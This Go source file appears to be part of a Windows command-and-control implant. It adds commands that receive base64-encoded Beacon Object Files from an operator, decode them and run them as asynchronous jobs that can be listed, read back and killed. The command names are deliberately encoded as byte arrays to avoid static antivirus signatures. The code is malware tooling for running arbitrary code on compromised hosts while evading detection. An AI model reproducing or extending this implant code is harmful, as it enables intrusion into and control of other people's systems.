// server/docker/payloads/Windows/action_bof_async.go
//go:build windows
// +build windows

package main

import (
	"encoding/base64"
	"runtime"
	"strings"
	"time"
)

// BOF command strings (constructed to avoid static signatures)
var (
	bofCmdAsync       = string([]byte{0x62, 0x6f, 0x66, 0x2d, 0x61, 0x73, 0x79, 0x6e, 0x63})                   // bof-async
	bofCmdJobs        = string([]byte{0x62, 0x6f, 0x66, 0x2d, 0x6a, 0x6f, 0x62, 0x73})                         // bof-jobs
	bofCmdOutput      = string([]byte{0x62, 0x6f, 0x66, 0x2d, 0x6f, 0x75, 0x74, 0x70, 0x75, 0x74})             // bof-output
	bofCmdKill        = string([]byte{0x62, 0x6f, 0x66, 0x2d, 0x6b, 0x69, 0x6c, 0x6c})                         // bof-kill
	bofCmdAsyncPrefix = string([]byte{0x62, 0x6f, 0x66, 0x2d, 0x61, 0x73, 0x79, 0x6e, 0x63, 0x20})             // bof-async
)

// BOFAsyncCommand handles async BOF execution
type BOFAsyncCommand struct{}

func (c *BOFAsyncCommand) Name() string {
	return bofCmdAsync
}

func (c *BOFAsyncCommand) Execute(ctx *CommandContext, args []string) CommandResult {
	if runtime.GOOS != bofOSWindows {
		return CommandResult{
			Output:      Err(E25),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}
	// Will be handled by processBOFAsync with full command data
	return CommandResult{
		Output:      Succ(S4),
		ExitCode:    0,
		CompletedAt: time.Now().Format(time.RFC3339),
	}
}

// BOFJobsCommand lists async BOF jobs
type BOFJobsCommand struct{}

func (c *BOFJobsCommand) Name() string {
	return bofCmdJobs
}

func (c *BOFJobsCommand) Execute(ctx *CommandContext, args []string) CommandResult {
	if runtime.GOOS != bofOSWindows {
		return CommandResult{
			Output:      Err(E25),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	// Call platform-specific implementation
	return executeBOFJobsList()
}

// BOFOutputCommand retrieves output from an async BOF job
type BOFOutputCommand struct{}

func (c *BOFOutputCommand) Name() string {
	return bofCmdOutput
}

func (c *BOFOutputCommand) Execute(ctx *CommandContext, args []string) CommandResult {
	if runtime.GOOS != bofOSWindows {
		return CommandResult{
			Output:      Err(E25),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	if len(args) < 1 {
		return CommandResult{
			Output:      Err(E1),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	jobID := args[0]
	return executeBOFGetOutput(jobID)
}

// BOFKillCommand terminates an async BOF job
type BOFKillCommand struct{}

func (c *BOFKillCommand) Name() string {
	return bofCmdKill
}

func (c *BOFKillCommand) Execute(ctx *CommandContext, args []string) CommandResult {
	if runtime.GOOS != bofOSWindows {
		return CommandResult{
			Output:      Err(E25),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	if len(args) < 1 {
		return CommandResult{
			Output:      Err(E1),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	jobID := args[0]
	return executeBOFKillJob(jobID)
}

// processBOFAsync handles async BOF execution (called from CommandQueue)
func (cq *CommandQueue) processBOFAsync(cmd Command) CommandResult {
	if runtime.GOOS != bofOSWindows {
		return CommandResult{
			Command:     cmd,
			Output:      Err(E25),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	// Decode BOF and parse arguments (reuse existing logic)
	bofBytes, err := base64.StdEncoding.DecodeString(cmd.Data)
	if err != nil {
		return CommandResult{
			Command:     cmd,
			Output:      Err(E18),
			Error:       err,
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	var bofArgs []byte
	if cmd.Command != "" && strings.HasPrefix(cmd.Command, bofCmdAsyncPrefix) {
		argString := strings.TrimPrefix(cmd.Command, bofCmdAsyncPrefix)
		if argString != "" {
			parsedArgs, err := parseBOFArguments(argString)
			if err != nil {
			} else {
				bofArgs = parsedArgs
			}
		}
	}

	// Execute async on Windows (platform-specific)
	return executeBOFAsyncPlatform(cmd, bofBytes, bofArgs)
}
